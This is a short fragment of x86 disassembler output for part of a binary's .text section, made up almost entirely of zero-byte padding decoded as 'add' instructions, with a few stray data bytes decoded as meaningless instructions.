                           .text:00401e7a 00 00                            add    %al,(%eax)
                           .text:00401e7c 00 00                            add    %al,(%eax)
                           .text:00401e7e 00 00                            add    %al,(%eax)
                           .text:00401e80 00 00                            add    %al,(%eax)
                           .text:00401e82 00 00                            add    %al,(%eax)
                           .text:00401e84 00 00                            add    %al,(%eax)
                           .text:00401e86 00 00                            add    %al,(%eax)
                           .text:00401e88 00 00                            add    %al,(%eax)
                           .text:00401e8a 00 00                            add    %al,(%eax)
                           .text:00401e8c 00 00                            add    %al,(%eax)
                           .text:00401e8e 00 00                            add    %al,(%eax)
                           .text:00401e90 00 00                            add    %al,(%eax)
                           .text:00401e92 00 00                            add    %al,(%eax)
                           .text:00401e94 00 00                            add    %al,(%eax)
                           .text:00401e96 00 00                            add    %al,(%eax)
                           .text:00401e98 00 00                            add    %al,(%eax)
                           .text:00401e9a 00 00                            add    %al,(%eax)
                           .text:00401e9c 00 00                            add    %al,(%eax)
                           .text:00401e9e 00 00                            add    %al,(%eax)
                           .text:00401ea0 00 00                            add    %al,(%eax)
                           .text:00401ea2 00 00                            add    %al,(%eax)
                           .text:00401ea4 00 00                            add    %al,(%eax)
                           .text:00401ea6 00 00                            add    %al,(%eax)
                           .text:00401ea8 00 00                            add    %al,(%eax)
                           .text:00401eaa 00 00                            add    %al,(%eax)
                           .text:00401eac 00 00                            add    %al,(%eax)
                           .text:00401eae 00 00                            add    %al,(%eax)
                           .text:00401eb0 00 00                            add    %al,(%eax)
                           .text:00401eb2 00 00                            add    %al,(%eax)
                           .text:00401eb4 00 00                            add    %al,(%eax)
                           .text:00401eb6 00 00                            add    %al,(%eax)
                           .text:00401eb8 00 00                            add    %al,(%eax)
                           .text:00401eba 00 00                            add    %al,(%eax)
                           .text:00401ebc 00 00                            add    %al,(%eax)
                           .text:00401ebe 00 00                            add    %al,(%eax)
                           .text:00401ec0 00 00                            add    %al,(%eax)
                           .text:00401ec2 00 00                            add    %al,(%eax)
                           .text:00401ec4 00 00                            add    %al,(%eax)
                           .text:00401ec6 00 00                            add    %al,(%eax)
                           .text:00401ec8 00 00                            add    %al,(%eax)
                           .text:00401eca 00 00                            add    %al,(%eax)
                           .text:00401ecc 00 00                            add    %al,(%eax)
                           .text:00401ece 00 00                            add    %al,(%eax)
                           .text:00401ed0 00 00                            add    %al,(%eax)
                           .text:00401ed2 00 00                            add    %al,(%eax)
                           .text:00401ed4 00 00                            add    %al,(%eax)
                           .text:00401ed6 00 00                            add    %al,(%eax)
                           .text:00401ed8 f3 e9 92 d0 38 b1                repz jmp 0xb178ef70
                           .text:00401ede fb                               sti    
                           .text:00401edf 44                               inc    %esp
                           .text:00401ee0 00 03                            add    %al,(%ebx)
                           .text:00401ee2 7b b8                            jnp    0x00401e9c
                           .text:00401ee4 bf 7f 00 00 b0                   mov    $0xb000007f,%edi
                           .text:00401ee9 58                               pop    %eax
                           .text:00401eea 70 00                            jo     0x00401eec
                           .text:00401eec 00 00                            add    %al,(%eax)
                           .text:00401eee 00 00                            add    %al,(%eax)
                           .text:00401ef0 f4                               hlt    
                           .text:00401ef1 2c 85                            sub    $0x85,%al
                           .text:00401ef3 bc 6d 52 ad 0b                   mov    $0xbad526d,%esp
                           .text:00401ef8 d0 08                            rorb   (%eax)
                           .text:00401efa 7b b8                            jnp    0x00401eb4
                           .text:00401efc bf 7f 00 00 20                   mov    $0x2000007f,%edi
                           .text:00401f01 51                               push   %ecx
                           .text:00401f02 64 b8 bf 7f 00 00                fs mov $0x7fbf,%eax
                           .text:00401f08 00 00                            add    %al,(%eax)
                           .text:00401f0a 00 00                            add    %al,(%eax)
                           .text:00401f0c 00 00                            add    %al,(%eax)
                           .text:00401f0e 00 00                            add    %al,(%eax)
                           .text:00401f10 00 00                            add    %al,(%eax)
                           .text:00401f12 00 00                            add    %al,(%eax)
                           .text:00401f14 00 00                            add    %al,(%eax)
                           .text:00401f16 00 00                            add    %al,(%eax)
                           .text:00401f18 00 00                            add    %al,(%eax)
                           .text:00401f1a 00 00                            add    %al,(%eax)
                           .text:00401f1c 00 00                            add    %al,(%eax)
                           .text:00401f1e 00 00                            add    %al,(%eax)
                           .text:00401f20 00 00                            add    %al,(%eax)
                           .text:00401f22 00 00                            add    %al,(%eax)
                           .text:00401f24 00 00                            add    %al,(%eax)
                           .text:00401f26 00 00                            add    %al,(%eax)
                           .text:00401f28 00 00                            add    %al,(%eax)
                           .text:00401f2a 00 00                            add    %al,(%eax)
                           .text:00401f2c 00 00                            add    %al,(%eax)
                           .text:00401f2e 00 00                            add    %al,(%eax)
                           .text:00401f30 00 00                            add    %al,(%eax)
                           .text:00401f32 00 00                            add    %al,(%eax)
                           .text:00401f34 00 00                            add    %al,(%eax)
                           .text:00401f36 00 00                            add    %al,(%eax)
                           .text:00401f38 00 00                            add    %al,(%eax)
                           .text:00401f3a 00 00                            add    %al,(%eax)
                           .text:00401f3c 00 00                            add    %al,(%eax)
                           .text:00401f3e 00 00                            add    %al,(%eax)
                           .text:00401f40 00 00                            add    %al,(%eax)
                           .text:00401f42 00 00                            add    %al,(%eax)
                           .text:00401f44 00 00                            add    %al,(%eax)
                           .text:00401f46 00 00                            add    %al,(%eax)
                           .text:00401f48 00 00                            add    %al,(%eax)
                           .text:00401f4a 00 00                            add    %al,(%eax)
                           .text:00401f4c 00 00                            add    %al,(%eax)
                           .text:00401f4e 00 00                            add    %al,(%eax)
                           .text:00401f50 00 00                            add    %al,(%eax)
                           .text:00401f52 00 00                            add    %al,(%eax)
                           .text:00401f54 00 00                            add    %al,(%eax)
                           .text:00401f56 00 00                            add    %al,(%eax)
                           .text:00401f58 00 00                            add    %al,(%eax)
                           .text:00401f5a 00 00                            add    %al,(%eax)
                           .text:00401f5c 00 00                            add    %al,(%eax)
                           .text:00401f5e 00 00                            add    %al,(%eax)
                           .text:00401f60 00 00                            add    %al,(%eax)
                           .text:00401f62 00 00                            add    %al,(%eax)
                           .text:00401f64 00 00                            add    %al,(%eax)
                           .text:00401f66 00 00                            add    %al,(%eax)
                           .text:00401f68 f9                               stc    
                           .text:00401f69 15 c7 b7 d9 5a                   adc    $0x5ad9b7c7,%eax
                           .text:00401f6e 91                               xchg   %eax,%ecx
                           .text:00401f6f 4b                               dec    %ebx
                           .text:00401f70 60                               pusha  
                           .text:00401f71 0f 7b                            (bad)  
                           .text:00401f73 b8 bf 7f 00 00                   mov    $0x7fbf,%eax
                           .text:00401f78 60                               pusha  
                           .text:00401f79 58                               pop    %eax
                           .text:00401f7a 70 00                            jo     0x00401f7c
                           .text:00401f7c 00 00                            add    %al,(%eax)
                           .text:00401f7e 00 00                            add    %al,(%eax)
                           .text:00401f80 00 00                            add    %al,(%eax)
                           .text:00401f82 00 00                            add    %al,(%eax)
                           .text:00401f84 00 00                            add    %al,(%eax)
                           .text:00401f86 00 00                            add    %al,(%eax)
                           .text:00401f88 00 00                            add    %al,(%eax)
                           .text:00401f8a 00 00                            add    %al,(%eax)
                           .text:00401f8c 00 00                            add    %al,(%eax)
                           .text:00401f8e 00 00                            add    %al,(%eax)
                           .text:00401f90 00 00                            add    %al,(%eax)
                           .text:00401f92 00 00                            add    %al,(%eax)
                           .text:00401f94 00 00                            add    %al,(%eax)
                           .text:00401f96 00 00                            add    %al,(%eax)
                           .text:00401f98 00 00                            add    %al,(%eax)
                           .text:00401f9a 00 00                            add    %al,(%eax)
                           .text:00401f9c 00 00                            add    %al,(%eax)
                           .text:00401f9e 00 00                            add    %al,(%eax)
                           .text:00401fa0 00 00                            add    %al,(%eax)
                           .text:00401fa2 00 00                            add    %al,(%eax)
                           .text:00401fa4 00 00                            add    %al,(%eax)
                           .text:00401fa6 00 00                            add    %al,(%eax)
                           .text:00401fa8 00 00                            add    %al,(%eax)
                           .text:00401faa 00 00                            add    %al,(%eax)
                           .text:00401fac 00 00                            add    %al,(%eax)
                           .text:00401fae 00 00                            add    %al,(%eax)
                           .text:00401fb0 00 00                            add    %al,(%eax)
                           .text:00401fb2 00 00                            add    %al,(%eax)
                           .text:00401fb4 00 00                            add    %al,(%eax)
                           .text:00401fb6 00 00                            add    %al,(%eax)
                           .text:00401fb8 00 00                            add    %al,(%eax)
                           .text:00401fba 00 00                            add    %al,(%eax)
                           .text:00401fbc 00 00                            add    %al,(%eax)
                           .text:00401fbe 00 00                            add    %al,(%eax)
                           .text:00401fc0 00 00                            add    %al,(%eax)
                           .text:00401fc2 00 00                            add    %al,(%eax)
                           .text:00401fc4 00 00                            add    %al,(%eax)
                           .text:00401fc6 00 00                            add    %al,(%eax)
                           .text:00401fc8 00 00                            add    %al,(%eax)
                           .text:00401fca 00 00                            add    %al,(%eax)
                           .text:00401fcc 00 00                            add    %al,(%eax)
                           .text:00401fce 00 00                            add    %al,(%eax)
                           .text:00401fd0 00 00                            add    %al,(%eax)
                           .text:00401fd2 00 00                            add    %al,(%eax)
                           .text:00401fd4 00 00                            add    %al,(%eax)
                           .text:00401fd6 00 00                            add    %al,(%eax)
                           .text:00401fd8 00 00                            add    %al,(%eax)
                           .text:00401fda 00 00                            add    %al,(%eax)
                           .text:00401fdc 00 00                            add    %al,(%eax)
                           .text:00401fde 00 00                            add    %al,(%eax)
                           .text:00401fe0 00 00                            add    %al,(%eax)
                           .text:00401fe2 00 00                            add    %al,(%eax)
                           .text:00401fe4 00 00                            add    %al,(%eax)
                           .text:00401fe6 00 00                            add    %al,(%eax)
                           .text:00401fe8 00 00                            add    %al,(%eax)
                           .text:00401fea 00 00                            add    %al,(%eax)
                           .text:00401fec 00 00                            add    %al,(%eax)
                           .text:00401fee 00 00                            add    %al,(%eax)
                           .text:00401ff0 00 00                            add    %al,(%eax)
                           .text:00401ff2 00 00                            add    %al,(%eax)
                           .text:00401ff4 00 00                            add    %al,(%eax)
                           .text:00401ff6 00 00                            add    %al,(%eax)
                           .text:00401ff8 7f 3f                            jg     0x00402039
                           .text:00401ffa 50                               push   %eax
                           .text:00401ffb 36 57                            ss push %edi
                           .text:00401ffd a6                               cmpsb  %es:(%edi),%ds:(%esi)
                           .text:00401ffe b0 07                            mov    $0x7,%al
